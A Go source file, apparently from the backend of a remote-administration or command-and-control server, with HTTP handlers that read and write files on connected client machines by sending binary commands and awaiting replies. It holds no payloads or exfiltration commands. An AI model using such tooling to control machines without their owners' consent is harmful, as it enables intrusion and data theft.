package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"context"
	"encoding/binary"
	"log"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

// FileEditReadRequest 读取文件请求
type FileEditReadRequest struct {
	Uid      string `json:"uid" binding:"required"`
	FilePath string `json:"filePath" binding:"required"`
}

// FileEditWriteRequest 写入文件请求
type FileEditWriteRequest struct {
	Uid      string `json:"uid" binding:"required"`
	FilePath string `json:"filePath" binding:"required"`
	Content  string `json:"content" binding:"required"`
}

// FileEditReadResponse 读取文件响应
type FileEditReadResponse struct {
	Status    int    `json:"status"`
	Message   string `json:"message"`
	Content   string `json:"content,omitempty"`
	FileSize  int    `json:"fileSize,omitempty"`
	Timestamp int64  `json:"timestamp"`
}

// FileEditWriteResponse 写入文件响应
type FileEditWriteResponse struct {
	Status    int    `json:"status"`
	Message   string `json:"message"`
	Timestamp int64  `json:"timestamp"`
}

// NewFileEditRead 新的文件读取API
func NewFileEditRead(c *gin.Context) {
	var req FileEditReadRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		log.Printf("NewFileEditRead - Invalid request: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{
			"status": http.StatusBadRequest,
			"error":  "请求参数无效: " + err.Error(),
		})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[req.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("NewFileEditRead - Client not connected: %s", req.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"status":       http.StatusBadRequest,
			"error":        "客户端未连接或已断开连接，无法读取文件",
			"disconnected": true,
			"uid":          req.Uid,
		})
		return
	}

	log.Printf("NewFileEditRead - Reading file: UID=%s, File=%s", req.Uid, req.FilePath)

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(req.FilePath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 大小限制：编辑接口仅支持小文件（10MB），大文件请用下载
	const maxEditSize = 10 * 1024 * 1024 // 10MB
	fi, statErr := os.Stat(req.FilePath)
	if statErr == nil && fi.Size() > maxEditSize {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  http.StatusBadRequest,
			"error":   "文件过大（超过10MB），无法在线编辑，请使用下载功能",
			"fileSize": fi.Size(),
		})
		return
	}

	// 构建读取文件命令（携带 requestId）
	requestId := nextRequestId()
	pathBytes := []byte(req.FilePath)
	pathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(pathLenBytes, uint32(len(pathBytes)))

	// 组合命令：requestId + 路径长度 + 路径
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), pathLenBytes, pathBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.FILE_EDIT_READ))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 创建等待队列（按 requestId 严格匹配，支持并发多编辑框）
	queue := command.VarFileEditQueue.GetReadQueue(req.Uid, strconv.Itoa(int(requestId)))

	// 发送读取命令
	sendcommand.SendFileUploadCommand(req.Uid, byteToSend)

	// 等待响应，设置120秒超时
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	select {
	case result := <-queue:
		if result.Success {
			log.Printf("NewFileEditRead - Success: UID=%s, File=%s, Size=%d", req.Uid, req.FilePath, len(result.Content))
			c.JSON(http.StatusOK, FileEditReadResponse{
				Status:    http.StatusOK,
				Message:   "文件读取成功",
				Content:   result.Content,
				FileSize:  len(result.Content),
				Timestamp: result.Timestamp,
			})
		} else {
			log.Printf("NewFileEditRead - Failed: UID=%s, File=%s, Error=%s", req.Uid, req.FilePath, result.ErrorMsg)
			c.JSON(http.StatusInternalServerError, gin.H{
				"status":  http.StatusInternalServerError,
				"error":   "文件读取失败: " + result.ErrorMsg,
				"message": result.Message,
			})
		}
	case <-ctx.Done():
		log.Printf("NewFileEditRead - Timeout: UID=%s, File=%s", req.Uid, req.FilePath)
		c.JSON(http.StatusRequestTimeout, gin.H{
			"status":   http.StatusRequestTimeout,
			"error":    "文件读取超时，请检查文件大小或网络连接状态",
			"timeout":  true,
			"filepath": req.FilePath,
		})
	}

	// 回收等待条目，防止 readQueues 随操作次数无限增长（内存泄漏）
	command.VarFileEditQueue.RemoveReadEntry(req.Uid, strconv.Itoa(int(requestId)))
}

// NewFileEditWrite 新的文件写入API
func NewFileEditWrite(c *gin.Context) {
	var req FileEditWriteRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		log.Printf("NewFileEditWrite - Invalid request: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{
			"status": http.StatusBadRequest,
			"error":  "请求参数无效: " + err.Error(),
		})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[req.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("NewFileEditWrite - Client not connected: %s", req.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"status":       http.StatusBadRequest,
			"error":        "客户端未连接或已断开连接，无法保存文件",
			"disconnected": true,
			"uid":          req.Uid,
		})
		return
	}

	log.Printf("NewFileEditWrite - Writing file: UID=%s, File=%s, Size=%d", req.Uid, req.FilePath, len(req.Content))

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(req.FilePath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 大小限制：编辑接口仅支持小文件（10MB）
	const maxEditSizeWrite = 10 * 1024 * 1024 // 10MB
	if len(req.Content) > maxEditSizeWrite {
		c.JSON(http.StatusBadRequest, gin.H{
			"status": http.StatusBadRequest,
			"error":  "文件过大（超过10MB），无法在线编辑，请使用上传功能",
		})
		return
	}

	// 构建写入文件命令（携带 requestId）
	requestId := nextRequestId()
	pathBytes := []byte(req.FilePath)
	contentBytes := []byte(req.Content)
	pathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(pathLenBytes, uint32(len(pathBytes)))

	// 组合命令：requestId + 路径长度 + 路径 + 内容
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), pathLenBytes, pathBytes, contentBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.FILE_EDIT_WRITE))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 创建等待队列（按 requestId 严格匹配）
	queue := command.VarFileEditQueue.GetWriteQueue(req.Uid, strconv.Itoa(int(requestId)))

	// 发送写入命令
	sendcommand.SendFileUploadCommand(req.Uid, byteToSend)

	// 等待响应，设置120秒超时
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	select {
	case result := <-queue:
		if result.Success {
			log.Printf("NewFileEditWrite - Success: UID=%s, File=%s", req.Uid, req.FilePath)
			c.JSON(http.StatusOK, FileEditWriteResponse{
				Status:    http.StatusOK,
				Message:   "文件保存成功",
				Timestamp: result.Timestamp,
			})
		} else {
			log.Printf("NewFileEditWrite - Failed: UID=%s, File=%s, Error=%s", req.Uid, req.FilePath, result.ErrorMsg)
			c.JSON(http.StatusInternalServerError, gin.H{
				"status":  http.StatusInternalServerError,
				"error":   "文件保存失败: " + result.ErrorMsg,
				"message": result.Message,
			})
		}
	case <-ctx.Done():
		log.Printf("NewFileEditWrite - Timeout: UID=%s, File=%s", req.Uid, req.FilePath)
		c.JSON(http.StatusRequestTimeout, gin.H{
			"status":   http.StatusRequestTimeout,
			"error":    "文件保存超时，请检查文件大小或网络连接状态",
			"timeout":  true,
			"filepath": req.FilePath,
		})
	}

	// 回收等待条目，防止 writeQueues 随操作次数无限增长（内存泄漏）
	command.VarFileEditQueue.RemoveWriteEntry(req.Uid, strconv.Itoa(int(requestId)))
}
